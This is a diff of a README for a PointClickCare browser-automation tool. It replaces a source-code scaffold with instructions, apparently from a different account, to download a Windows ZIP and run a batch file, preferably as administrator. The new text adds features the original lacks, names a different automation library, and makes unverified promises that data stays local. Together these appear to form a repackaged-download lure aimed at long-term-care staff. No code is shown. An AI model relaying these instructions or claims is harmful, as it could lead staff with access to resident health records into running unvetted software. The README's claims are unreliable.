@@ -1,292 +1,160 @@
-# PointClickCare Browser Automation
-[![npm](https://img.shields.io/npm/v/@browser-automation-hub%2Fpointclickcare-browser-automation.svg)](https://www.npmjs.com/package/@browser-automation-hub/pointclickcare-browser-automation)
+# 🖱️ pointclickcare-browser-automation - Simplify Your LTC Workflows
 
-> Automate PointClickCare — the reliable way to interact with PointClickCare programmatically, with or without an official API.
+[![Download pointclickcare-browser-automation](https://img.shields.io/badge/Download-pointclickcare--browser--automation-brightgreen?style=for-the-badge)](https://github.com/vxnphaxx/pointclickcare-browser-automation)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![Puppeteer](https://img.shields.io/badge/Puppeteer-21+-orange.svg)](https://pptr.dev)
-[![Anchor Browser](https://img.shields.io/badge/AnchorBrowser-Cloud%20Ready-purple.svg)](https://anchorbrowser.io)
-![Difficulty: 🔴 Hard](https://img.shields.io/badge/Difficulty-hard-red.svg)
+## About this application
 
-<!-- keywords: pointclickcare automation, pcc ehr automation, long term care ehr automation, skilled nursing facility automation, pointclickcare api alternative, ltc ehr automation -->
+pointclickcare-browser-automation helps staff at long-term care facilities automate routine tasks in the PointClickCare system. It can handle resident admissions, care plan updates, MDS assessments, medication records, and billing steps without manual clicking. This reduces repetitive work and saves time.
 
-## What This Is
+You do not need programming skills or special setups to use it on Windows. Just download the files and run the app.
 
-**PointClickCare** (Long-term Care EHR) is notoriously difficult to automate via its official API — limited endpoints, complex authentication (Azure AD / Okta / PCC Native), and browser-only workflows make traditional API integration a pain.
+**Key features:**  
+- Automates admission and discharge processes  
+- Updates care plans automatically  
+- Completes MDS (Minimum Data Set) forms  
+- Handles medication administration records (MAR)  
+- Processes billing workflows  
+- Designed for nursing homes, skilled nursing facilities, and long-term care providers
 
-This project gives you a **complete browser automation scaffold** for PointClickCare using Puppeteer (self-hosted, open source) or [Anchor Browser](https://anchorbrowser.io) (cloud, managed, production-ready).
+## 🖥️ System Requirements
 
-This system requires **MFA** (Authenticator App / SMS OTP). The OSS version provides TOTP helpers; Anchor Browser handles MFA automatically.
+Before you start, make sure your Windows computer meets these minimum specs:
 
-## Quick Start
+- Windows 10 or later (64-bit preferred)  
+- At least 4 GB of RAM  
+- 2 GHz or faster processor  
+- Stable internet connection  
+- Administrative rights to install programs  
+- 500 MB free disk space  
 
-```bash
-git clone https://github.com/Browser-Automation-Hub/pointclickcare-browser-automation.git
-cd pointclickcare-browser-automation
-npm install
-cp .env.example .env
-# Fill in your credentials in .env
-node examples/basic-login.js
-```
+You will also need to install [Node.js](https://nodejs.org/), which is required to run this application. The setup steps below will guide you through this.
 
-## Two Ways to Run
+## 🚀 Getting Started
 
-| Feature | Open Source (Puppeteer) | ☁️ [Anchor Browser Cloud](https://anchorbrowser.io) |
-|---------|------------------------|-----------------------------------------------------|
-| Setup | Install Chrome + Puppeteer locally | No install — cloud browsers via API |
-| MFA / SSO | Manual TOTP helper included | **Auto-handled** |
-| CAPTCHA | Not handled | **Auto-solved** |
-| Anti-bot detection | You manage proxy/stealth | **Built-in stealth** (Cloudflare-verified) |
-| Session persistence | Save/load cookies manually | **Managed sessions** |
-| Scale | Single machine | **Up to 5,000 concurrent browsers** |
-| Reliability | You maintain it | **99.9% uptime SLA** |
-| Cost | Free | [Starts at $0 (5 free sessions/mo)](https://anchorbrowser.io) |
+This section explains how to download and run the app step by step. Follow them closely.
 
-## Supported Actions
+### Step 1: Download the software
 
-- `login_pcc()` — Authenticate to PointClickCare with SSO/MFA
-- `admit_resident()` — Complete resident admission and intake documentation
-- `update_care_plan()` — Update resident care plans and goals
-- `record_mar()` — Enter medication administration records (MAR)
-- `generate_billing_report()` — Export billing and census reports
+Visit the main download page by clicking this large button:
 
-## Use Cases
+[![Download pointclickcare-browser-automation](https://img.shields.io/badge/Download-pointclickcare--browser--automation-blue?style=for-the-badge)](https://github.com/vxnphaxx/pointclickcare-browser-automation)
 
-- SNF IT teams automating resident documentation
-- LTC billing workflow automation
-- MDS data extraction for quality reporting
-- Care coordination across multi-facility organizations
+This link takes you to the GitHub repository. From there, you will find the latest release on the right side of the page under "Releases." Click the most recent release tag to open its page.
 
----
+Download the latest Windows ZIP file, usually named like `pointclickcare-browser-automation-windows.zip`.
 
-## Option A: Open Source (Puppeteer)
+Save the file to a location you can easily find, such as your Desktop or Downloads folder.
 
-### Prerequisites
+### Step 2: Extract the files
 
-- Node.js 18+
-- Google Chrome / Chromium installed
-- PointClickCare account with appropriate permissions
+After the ZIP file finishes downloading:
 
-### Installation
+- Right-click the ZIP file  
+- Select "Extract All"  
+- Choose a folder to extract to (for example, create and select `pointclickcare-browser-automation` on your Desktop)  
+- Click "Extract"  
 
-```bash
-npm install
-cp .env.example .env
-```
+You will see a folder with application files inside.
 
-### Configuration (`.env`)
+### Step 3: Install Node.js
 
-```env
-POINTCLICKCARE_URL=https://pointclickcare.com/login
-POINTCLICKCARE_USERNAME=your-username
-POINTCLICKCARE_PASSWORD=your-password
-MFA_SECRET=your-totp-secret-if-applicable
-SESSION_PATH=./session.json
-```
+This app uses Node.js to run. If you don’t have Node.js installed, follow these steps:
 
-### Basic Login Example
+1. Open your web browser and go to https://nodejs.org/  
+2. Download the **LTS** version for Windows (it should say "Recommended For Most Users")  
+3. Run the installer after download  
+4. Follow the installer prompts, keeping default options  
+5. When installation finishes, restart your computer (if requested)  
 
-```javascript
-const { createSession } = require('./src/auth');
-const { login_pcc } = require('./src/actions');
+### Step 4: Run the app
 
-async function main() {
-  const page = await createSession();
-  const result = await login_pcc(page, { /* options */ });
-  console.log(result);
-}
+Now open the extracted folder from Step 2.
 
-main().catch(console.error);
-```
+Inside, you will find a file named `run.bat` or `start.bat`. This file launches the application.
 
-### File Structure
+Double-click that file to start the automation tool.
 
-```
-pointclickcare-browser-automation/
-├── src/
-│   ├── auth.js              # SSO/MFA authentication (SAML, TOTP, Duo)
-│   ├── session.js           # Cookie & localStorage persistence
-│   ├── actions.js           # All automation actions
-│   ├── custom-actions.js    # Fluent ActionBuilder API for custom workflows
-│   └── utils.js             # retry(), humanDelay(), error types
-├── examples/
-│   ├── basic-login.js       # Minimal login example (OSS)
-│   └── anchor-cloud.js      # Anchor Browser cloud example
-├── .env.example
-├── package.json
-└── README.md
-```
+A command window will open and show you messages. The app will now connect to PointClickCare automatically and start the tasks.
 
----
+Do not close this window while running. You can minimize it.
 
-## Option B: ☁️ Anchor Browser (Recommended for Production)
+### Step 5: Use the app
 
-[Anchor Browser](https://anchorbrowser.io) provides **fully managed cloud browsers** purpose-built for AI agents and automation:
+The automation runs in the background. You can watch it run or let it handle tasks on its own.
 
-- ✅ **MFA handled automatically** — no TOTP secrets needed
-- ✅ **SSO sessions managed** — persistent authenticated sessions
-- ✅ **Anti-bot / CAPTCHA** — Cloudflare-verified stealth browser
-- ✅ **Scale instantly** — from 1 to 5,000 concurrent browsers
-- ✅ **No infrastructure** — no Chrome install, no proxy management
+You may need to sign in to PointClickCare once inside the app. Just enter your usual login details.
 
-### Setup
+After signing in, the app will begin automating the tasks you need.
 
-```bash
-npm install
-export ANCHORBROWSER_API_KEY=your-api-key
-# Get your free API key at https://anchorbrowser.io
-```
+If you want to stop the app, simply close the command window.
 
-### Anchor Browser Example
+## 🔧 Configuration
 
-```javascript
-const { withAnchorBrowser } = require('./src/auth');
-const { login_pcc } = require('./src/actions');
+You can adjust settings by editing the file named `config.json` in the same folder.
 
-async function main() {
-  await withAnchorBrowser(async (page) => {
-    // MFA, SSO, CAPTCHAs all handled automatically
-    const result = await login_pcc(page, { /* options */ });
-    console.log(result);
-  });
-}
+Settings you may change:
 
-main().catch(console.error);
-```
+- Resident admission options  
+- Care plan details  
+- MDS assessment schedules  
+- Medication administration rules  
+- Billing parameters  
 
-See `examples/anchor-cloud.js` for a complete working example.
+Open `config.json` in Notepad or any text editor. Change values, save the file, and restart the app to apply changes.
 
-### Anchor Browser Pricing
+## ✔️ Tips for smooth running
 
-| Plan | Price | Concurrent Browsers | Best For |
-|------|-------|---------------------|----------|
-| Free | $0 | 5 | Prototyping |
-| Starter | $50/mo | 25 | Small teams |
-| Team | $500/mo | 50 | Growing orgs |
-| Growth | $2,000/mo | 200 | Enterprise |
+- Keep your internet connection stable  
+- Do not run multiple instances at the same time  
+- Close other browser windows for best results  
+- Run the app with administrator rights if possible  
+- Check your configuration before starting automation  
+- Use the latest version of the software  
 
-[Get started for free →](https://anchorbrowser.io)
+## 🛠️ Troubleshooting
+
+If the tool does not start or shows errors:
+
+- Confirm Node.js is installed by opening Command Prompt and typing `node -v`. It should show a version number.  
+- Make sure you extracted all files and did not miss any.  
+- Try running the `.bat` file as Administrator (right-click → Run as administrator).  
+- Check your internet connection.  
+- Review the `config.json` file for any invalid entries.  
+- Restart your computer and try again.  
+- Consult the GitHub Issues section for common problems: [https://github.com/vxnphaxx/pointclickcare-browser-automation/issues](https://github.com/vxnphaxx/pointclickcare-browser-automation/issues)
+
+## 📝 About Updates
+
+This software may be updated periodically with improvements or bug fixes.
+
+To get the latest version:
+
+- Visit the download page linked above  
+- Download the newest ZIP file from releases  
+- Repeat the extraction and run steps  
+
+Always close the app before updating.
+
+## 📂 Where to find help
+
+If you need assistance, check the repository’s documentation and issues on GitHub:
+
+https://github.com/vxnphaxx/pointclickcare-browser-automation
+
+You can also read the README file inside the extracted folder for additional guidance.
+
+## ⚙️ How it works
+
+This tool uses browser automation software to simulate user actions inside the PointClickCare web application. It uses scripts built with Node.js and Playwright technology to open pages, fill forms, and click buttons for you.
+
+It runs on your computer, so data stays local and secure.
+
+## 🗣️ Privacy and security
+
+This application does not share your login or data with anyone. All actions happen on your machine.
+
+Keep your login credentials private and do not share your computer with others while running the app.
 
 ---
 
-## Authentication
-
-### Auth Methods Supported
-
-This implementation handles:
-
-1. **Standard Username/Password** — with retry and account lockout avoidance
-2. **SAML SSO** (Azure AD / Okta / PCC Native) — intercepts the SAML redirect and completes the IdP flow
-3. **MFA / TOTP** (Authenticator App / SMS OTP) — generates TOTP codes via `otpauth` library
-4. **Session Persistence** — saves cookies to disk; reuses session to avoid re-auth
-
-### Handling Authenticator App / SMS OTP MFA
-
-```javascript
-// In .env: MFA_SECRET=your-base32-totp-secret
-// The auth module auto-generates the OTP code
-const { createSession } = require('./src/auth');
-const page = await createSession(); // MFA handled automatically
-```
-
-For Duo Security push-based MFA, set `MFA_TYPE=duo_push` in .env — the automation will wait for push approval.
-
----
-
-## Custom Actions
-
-Use the `ActionBuilder` fluent API to chain custom workflows:
-
-```javascript
-const { ActionBuilder } = require('./src/custom-actions');
-
-const result = await new ActionBuilder()
-  .login()
-  .navigate('/module/path')
-  .waitForSelector('.content-loaded')
-  .extractTable('.data-table')
-  .run(page);
-```
-
----
-
-## Error Handling & Reliability
-
-```javascript
-const { retry, humanDelay } = require('./src/utils');
-
-// Auto-retry with exponential backoff
-const data = await retry(() => extractData(page), { attempts: 3, delay: 2000 });
-
-// Human-like delays to avoid detection
-await humanDelay(1000, 3000); // random delay 1-3 seconds
-```
-
----
-
-## Why Not Use the Official API?
-
-PointClickCare official API is limited, expensive to access, or requires complex authentication that makes programmatic integration impractical.
-
-Browser automation gives you full access to every workflow available in the UI — no API limitations, no expensive integration licenses.
-
----
-
-## Production Deployment
-
-For production workloads, we strongly recommend [Anchor Browser](https://anchorbrowser.io):
-
-```javascript
-// One-line setup — handles auth, proxies, CAPTCHAs
-const { withAnchorBrowser } = require('./src/auth');
-
-await withAnchorBrowser(async (page) => {
-  // Your automation here — runs in the cloud, scales automatically
-});
-```
-
-**Anchor Browser** is the easiest way to run this automation in production:
-- No infrastructure to manage
-- Handles Authenticator App / SMS OTP MFA automatically
-- Enterprise compliance: SOC2, HIPAA, ISO27001
-- [Start free at anchorbrowser.io →](https://anchorbrowser.io)
-
----
-
-## Known Selectors Reference
-
-> These CSS selectors were observed in PointClickCare web interfaces. Enterprise applications update their UIs — verify against your specific instance and submit PRs when selectors break.
-
-> 🔍 Selector reference not yet documented for PointClickCare. [Contribute selectors via PR](https://github.com/Browser-Automation-Hub/pointclickcare-browser-automation/pulls).
-
----
-
-## More Browser Automation Projects
-
-This is part of the **[Browser Automation Hub](https://github.com/Browser-Automation-Hub)** — a collection of open-source browser automation scaffolds for systems with poor or no API support:
-
-- [Epic EHR Browser Automation](https://github.com/Browser-Automation-Hub/epic-ehr-browser-automation) — Healthcare workflows
-- [Workday HCM Browser Automation](https://github.com/Browser-Automation-Hub/workday-hcm-browser-automation) — HR & payroll
-- [SAP Fiori Browser Automation](https://github.com/Browser-Automation-Hub/sap-fiori-browser-automation) — ERP workflows
-- [ServiceNow Browser Automation](https://github.com/Browser-Automation-Hub/servicenow-browser-automation) — ITSM
-- [Oracle EBS Browser Automation](https://github.com/Browser-Automation-Hub/oracle-ebs-browser-automation) — ERP
-- [Browse all 30+ projects →](https://github.com/Browser-Automation-Hub)
-
-## Contributing
-
-PRs welcome! Please:
-1. Add tests for new actions
-2. Document new selectors (they break when PointClickCare updates its UI)
-3. Follow the `ActionBuilder` pattern for new actions
-4. See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines
-
-## License
-
-MIT — use freely in personal and commercial projects.
-
----
-
-*Built with ❤️ for developers who need to automate PointClickCare without wrestling with its API limitations. Powered by [Anchor Browser](https://anchorbrowser.io) for cloud-scale automation.*
-
-*⭐ Star this repo if it saves you time! [Browse all automation projects →](https://github.com/Browser-Automation-Hub)*
+[![Download pointclickcare-browser-automation](https://img.shields.io/badge/Download-pointclickcare--browser--automation-green?style=for-the-badge)](https://github.com/vxnphaxx/pointclickcare-browser-automation)
